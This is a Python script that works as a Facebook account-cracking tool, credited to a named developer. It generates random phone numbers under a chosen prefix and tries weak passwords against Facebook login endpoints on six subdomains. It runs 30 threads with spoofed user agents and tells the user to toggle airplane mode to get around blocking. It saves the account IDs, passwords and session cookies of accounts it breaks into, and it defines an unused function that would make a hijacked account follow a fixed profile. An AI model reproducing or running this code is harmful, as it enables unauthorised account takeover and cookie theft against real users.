from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python XERX.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
P = "\x1b[0;97m" #White
M = "\x1b[0;91m" # BLACK
H = "\x1b[0;92m" # GREEN
K = "\x1b[0;93m" # YELLOW
B = "\x1b[0;94m" # BLUE 
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # FEROZII
N = "\033[0m"    # WHITE
ugen2=[]
ugen=[]
younis_HaZraToO = [] 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
logo ="""\033[93;1m
 
 .S    S.    .S_SSSs     sdSSSSSSSbs   .S_sSSs     .S_SSSs    sdSS_SSSSSSbs  
.SS    SS.  .SS~SSSSS    YSSSSSSSS%S  .SS~YS%%b   .SS~SSSSS   YSSS~S%SSSSSP  
S%S    S%S  S%S   SSSS          S%S   S%S   `S%b  S%S   SSSS       S%S       
S%S    S%S  S%S    S%S         S&S    S%S    S%S  S%S    S%S       S%S       
S%S SSSS%S  S%S SSSS%S        S&S     S%S    d*S  S%S SSSS%S       S&S       
S&S  SSS&S  S&S  SSS%S        S&S     S&S   .S*S  S&S  SSS%S       S&S       
S&S    S&S  S&S    S&S       S&S      S&S_sdSSS   S&S    S&S       S&S       
S&S    S&S  S&S    S&S      S*S       S&S~YSY%b   S&S    S&S       S&S       
S*S    S*S  S*S    S&S     S*S        S*S   `S%b  S*S    S&S       S*S       
S*S    S*S  S*S    S*S   .s*S         S*S    S%S  S*S    S*S       S*S       
S*S    S*S  S*S    S*S   sY*SSSSSSSP  S*S    S&S  S*S    S*S       S*S       
SSS    S*S  SSS    S*S  sY*SSSSSSSSP  S*S    SSS  SSS    S*S       S*S       
       SP          SP                 SP                 SP        SP        
       Y           Y                  Y                  Y         Y         
----------------------------------------------
Developer : RAYEES.HAZRAT
Facebook  : https://www.facebook.com/RayeesHazratoo313?mibextid=ZbWKwL
----------------------------------------------"""
xxxx = str(len(ugen))
loop = 0
oks = []
cps = []
xxx =[]
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \033[1;93mSorry there is no Active  Apk')
    else:
        print('\r[ðŸŽ®] \033[1;92m â˜† Your Active Apps â˜† \033[1;91m: \033[1;96m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
            
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print('\r\033[1;92m[+]\033[1;91m Sorry there is no Expired Apk')
    else:
        print('\r[ðŸŽ®] \033[1;96m â—‡ Your Expired Apps â—‡ \033[1;91m: \033[1;92m')
        for i in range(len(game)):
            print("\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('\033[1;97m====================================================') 
def follow(ses,coki):
    ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
def YounisHaZraToO():
	user=[]
	os.system('clear')
	print(logo)
	print('For Example: 0300,0304,0311,0313,0331,0340,0343')
	kode = input('Input Code : ')
	limit = int(input('How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	os.system("clear")
	print(logo)
	print("                LOGIN METHOD                       ")
	print(48*"-")
	print("[1] mabsic.facebook.com\n[2] p.facebook.com\n[3] x.facebook.com\n[4] m.facebook.com\n[5] free.facebook.com\n[6] d.facebook.com")
	print(48*"-")
	younisjohn = input("Select Method: ")
	os.system("clear")
	print(logo)
	print("Do you want to show cookies & Aps from OK ids (y/n) ?")
	HaZraToO_jj = input("Select: ")
	if HaZraToO_jj in ['y','Y','1','yes','YES','Yes']:
		younis_HaZraToO.append('y')
	else:
		younis_HaZraToO.append('n')
	os.system("clear");print(logo);print("do you want to display cp ids on the terminal ?  ")
	HaZraToO = input("Select: ")
	if HaZraToO in ['y','Y','Yes','YES','1']:
		xxx.append('y')
	else:
		xxx.append('n')
	with ThreadPool(max_workers=30) as younisHaZraToO:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(f"Total ids  : "+tl+" ")
		print(f"Choice code : "+kode)
		print(48*"-");print(f'    USE FLIGHT ({M}AIRPLANE{P}) MODE BEFORE USE');print(48*"-")
		for younizyx in user:
			uid = kode+younizyx
			HaZraToOx = uid[:6]
			pwx = [younizyx]
			pwx = [kode+younizyx,HaZraToOx,'khankhan','khan123','khan1122','khan12345']
			if younisjohn =='1':younisHaZraToO.submit(mbasic,uid,pwx,tl)
			elif younisjohn =='2':younisHaZraToO.submit(p,uid,pwx,tl)
			elif younisjohn =='3':younisHaZraToO.submit(x,uid,pwx,tl)
			elif younisjohn =='4':younisHaZraToO.submit(mobile,uid,pwx,tl)
			elif younisjohn =='5':younisHaZraToO.submit(freeq,uid,pwx,tl)
			elif younisjohn =='6':younisHaZraToO.submit(d,uid,pwx,tl)
			else:
			    younisHaZraToO.submit(p,uid,pwx,tl)
	print(48*"-")
	print('Crack process has been completed')
	print('ids saved in HaZraToO-OK.txt,HaZraToO-CP.txt')
	print(48*"-")
def mbasic(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'mbasic.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': pro}
			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\r\33[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\r\33[0;97m')
				if 'y' in younis_HaZraToO:
					print("\33[1;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HaZraToO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in xxx:
					print('\r\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\r\33[0;97m')
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r  %s/mbasic.facebook.com [OK:%s] [CP:%s] \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
def p(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://p.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'p.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': pro}
			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\r\33[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\r\33[0;97m')
				if 'y' in younis_HaZraToO:
					print("\33[1;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HaZraToO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in xxx:
					print('\r\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\r\33[0;97m')
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r  %s/p.facebook.com [OK:%s] [CP:%s] \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
def x(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://x.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			headers = {'authority': 'x.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13',}
			lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\r\33[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\r\33[0;97m')
				if 'y' in younis_HaZraToO:
					print("\33[1;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HaZraToO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in xxx:
					print('\r\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\r\33[0;97m')
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r  %s/x.facebook.com [OK:%s] [CP:%s] \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
def mobile(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': pro}
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\r\33[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\r\33[0;97m')
				if 'y' in younis_HaZraToO:
					print("\33[1;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HaZraToO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in xxx:
					print('\r\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\r\33[0;97m')
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/XYX-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r  %s/m.facebook.com [OK:%s] [CP:%s] \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
def freeq(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'free.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': pro}
			lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\r\33[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\r\33[0;97m')
				if 'y' in younis_HaZraToO:
					print("\33[1;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HaZraToO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in xxx:
					print('\r\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\r\33[0;97m')
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r  %s/free.facebook.com [OK:%s] [CP:%s] \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
def d(uid,pwx,tl):
	global loop
	global oks
	global cps
	global ugen
	try:
		for ps in pwx:
			pro = random.choice(ugen)
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://d.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'d.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': pro}
			lo = session.post('https://d.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[HaZraToO-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in younis_HaZraToO:
					print("\33[0;97m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/HaZraToO-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in xxx:
					print('\33[1;91m[HaZraToO-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				
				open('/sdcard/HaZraToO-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r  %s/d.facebook.com [OK:%s] [CP:%s] \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
YounisHaZraToO()
